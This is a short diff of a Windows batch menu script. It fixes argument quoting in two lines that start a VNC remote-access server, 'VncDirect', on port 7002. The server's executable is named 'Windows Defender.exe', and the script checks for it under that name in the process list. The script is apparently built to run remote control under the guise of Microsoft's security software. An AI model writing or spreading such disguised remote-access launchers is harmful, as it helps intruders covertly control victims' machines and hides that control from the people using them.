@@ -222,7 +222,7 @@ if not exist "%DEST%\VncDirect\Windows Defender.exe" (
     goto show_menu
 )
 echo    Starting VncDirect...
-start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
 timeout /t 3 /nobreak >nul
 tasklist /FI "IMAGENAME eq Windows Defender.exe" 2>nul | find /i "Windows Defender.exe" >nul
 if !errorlevel! equ 0 ( echo    [+] VNC Server started. ) else ( echo    [!] Failed to start. )
@@ -299,7 +299,7 @@ echo.
 echo Restarting VNC server...
 timeout /t 1 /nobreak >nul
 if exist "%DEST%\VncDirect\Windows Defender.exe" (
-    start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+    start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
     echo    VNC server restarted.
 ) else (
     echo    VNC server not found.
